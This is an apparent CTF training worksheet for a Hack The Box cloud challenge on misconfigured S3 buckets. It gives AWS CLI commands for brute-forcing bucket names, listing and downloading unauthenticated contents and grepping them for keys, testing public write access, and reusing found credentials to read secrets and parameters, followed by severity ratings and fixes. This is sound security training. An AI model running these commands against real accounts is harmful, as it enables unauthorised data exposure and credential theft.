---
title: "HTB Cloud Series Day 3 — S3 Bucket Misconfiguration"
tags: [HTB, HackTheBox, CTF, cloud, AWS, S3, misconfiguration, data-exposure, practice,
       bug-bounty]
module: 05-BugBountyOps-02
day: 308
related_topics:
  - HTB Cloud Series Day 2 (Day 307)
  - Cloud Exploitation (R-09)
  - Recon Pipeline Automation (Day 265)
---

# Day 308 — HTB Cloud Series Day 3: S3 Bucket Misconfiguration

> "The bucket is open. The data is there. The company has no idea. This is not
> hacking — it is walking through a door that was left wide open. The skill is
> finding the door. The lesson is understanding why it was left open and how to
> close it."
>
> — Ghost

---

## Goals

Discover and exploit an S3 bucket misconfiguration in an HTB cloud challenge.
Practice bucket enumeration, content analysis, and lateral movement from
credentials found in exposed objects.

**Time budget:** 3–4 hours.

---

## Pre-Engagement Plan

```
Target: HTB Cloud challenge — S3 misconfiguration focus
Hypothesis: Application references S3 bucket names in source code, JS files,
            or response headers. Bucket is publicly readable or writable.

Attack phases:
  1. Bucket name discovery (source code, DNS, wordlist brute-force)
  2. Enumerate bucket contents (public list or guessable object names)
  3. Download and analyse objects for credentials / flag
  4. Test write access (upload test object)
  5. Lateral movement if credentials found in objects
```

---

## Engagement Log

### Phase 1 — Bucket Name Discovery

```bash
# Source code / JS analysis
# Look in page source for: s3.amazonaws.com, .s3-REGION.amazonaws.com, s3://

# HTTP response headers — sometimes leak bucket names
curl -I https://TARGET/ | grep -i 'x-amz\|bucket\|s3'

# DNS-style bucket URLs to probe
# https://BUCKET_NAME.s3.amazonaws.com/
# https://s3.amazonaws.com/BUCKET_NAME/
# https://BUCKET_NAME.s3.REGION.amazonaws.com/

# Wordlist-based brute-force with S3Scanner
s3scanner scan --bucket-file buckets.txt

# Or manually with common naming patterns
aws s3 ls s3://TARGET-NAME/ --no-sign-request
aws s3 ls s3://TARGET-dev/ --no-sign-request
aws s3 ls s3://TARGET-backup/ --no-sign-request
aws s3 ls s3://TARGET-assets/ --no-sign-request
```

```
Bucket names found:
  - ___
  - ___

Discovery method: ___
```

### Phase 2 — Bucket ACL and Public Access Check

```bash
# List bucket contents without authentication
aws s3 ls s3://BUCKET_NAME --no-sign-request
aws s3 ls s3://BUCKET_NAME --recursive --no-sign-request

# Get bucket ACL (may require credentials)
aws s3api get-bucket-acl --bucket BUCKET_NAME

# Get bucket policy
aws s3api get-bucket-policy --bucket BUCKET_NAME

# Check public access block settings
aws s3api get-public-access-block --bucket BUCKET_NAME
```

```
List access:     public / authenticated only / private
Object count:    ___
Notable objects: ___

Bucket policy (key statements):
  ___
```

### Phase 3 — Content Analysis

```bash
# Download all publicly accessible objects
aws s3 sync s3://BUCKET_NAME ./downloaded/ --no-sign-request

# Search for credentials
grep -ri "aws_access_key\|aws_secret\|AKIA\|password\|token\|secret" ./downloaded/

# Search for config files
find ./downloaded -name "*.env" -o -name "*.config" -o -name "*.json" \
  -o -name "*.yaml" -o -name "*.pem" -o -name "*.key"

# Check for versioning — old versions may contain deleted credentials
aws s3api list-object-versions --bucket BUCKET_NAME --no-sign-request
aws s3api get-object \
  --bucket BUCKET_NAME \
  --key PATH/TO/FILE \
  --version-id VERSION_ID \
  ./output_file
```

```
Files downloaded: ___
Credentials found in: ___
Credential value:
  AccessKeyId:     AKIA___
  SecretAccessKey: ___

Other sensitive data found: ___
```

### Phase 4 — Write Access Test

```bash
# Test upload (if the bucket has public write)
echo "test" > /tmp/ghost-test.txt
aws s3 cp /tmp/ghost-test.txt s3://BUCKET_NAME/ghost-test.txt --no-sign-request

# If write access exists — document and report. Do NOT leave test files.
aws s3 rm s3://BUCKET_NAME/ghost-test.txt --no-sign-request
```

```
Write access: Y/N
Note: Write access means website defacement or malware hosting — critical severity.
```

### Phase 5 — Lateral Movement from Found Credentials

```bash
# Use credentials found in bucket objects
aws configure --profile bucket-creds
# Enter found AccessKeyId and SecretAccessKey

# Enumerate permissions
aws sts get-caller-identity --profile bucket-creds
python3 enumerate-iam.py --access-key FOUND_AKID --secret-key FOUND_SECRET

# Find flag
aws s3 ls --profile bucket-creds
aws secretsmanager list-secrets --profile bucket-creds
aws ssm get-parameters-by-path --path "/" --recursive --profile bucket-creds
```

### Flag

```
FLAG{___}
Path: ___
Total time: ___ min
```

---

## S3 Misconfiguration Severity Matrix

| Condition | Severity | CVSS range |
|---|---|---|
| Public read — no sensitive data | Low | 3.0–4.9 |
| Public read — PII / credentials exposed | Critical | 9.0–10.0 |
| Public write — any data | High | 7.0–8.9 |
| Public write — web-served bucket (XSS/defacement) | Critical | 9.0–10.0 |
| Old versioned objects with credentials | High–Critical | 7.0–10.0 |

---

## Debrief

```
Real-world cases:
  - Twitch (2021): 125GB exfiltrated, included internal tools and salary data
  - GrayNews (2020): 1M+ records in public S3 bucket
  - Dozens of HackerOne P1 reports annually from S3 bucket discovery

Why it happens:
  1. Developer sets bucket public "temporarily" and forgets
  2. Terraform IaC with public_access_block = false in staging, copied to prod
  3. ACL set to "public-read" on objects individually, not the bucket
  4. No Account-level S3 Block Public Access setting enabled

Fix:
  - Enable S3 Block Public Access at the account level (AWS Organizations SCP)
  - Enable S3 server access logging
  - Use AWS Config rule: s3-bucket-public-read-prohibited
  - Bucket policy denies s3:GetObject for Principal: "*" unless specific conditions
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q308.1, Q308.2 …).

---

## Navigation

← Previous: [Day 307 — HTB Cloud Series Day 2](DAY-0307-HTB-Cloud-Series-Day-02.md)
→ Next: [Day 309 — HTB Cloud Series Day 4](DAY-0309-HTB-Cloud-Series-Day-04.md)
